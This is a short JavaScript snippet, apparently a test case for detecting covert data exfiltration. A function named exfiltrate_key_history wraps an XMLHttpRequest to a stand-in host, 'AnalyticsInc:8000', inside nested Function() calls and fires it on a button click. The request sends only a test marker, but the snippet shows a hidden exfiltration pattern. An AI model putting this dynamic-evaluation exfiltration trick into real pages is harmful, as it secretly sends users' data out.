function exfiltrate_key_history() {

    // Nested Anonymous Function 3 - No Obfuscation
    // Exfiltrate data using XMLHTTP request
	var nest='var exp=\'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=nest3", true);xmlhttp.send(null);\';return Function(exp);';
	((Function(nest)())());
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
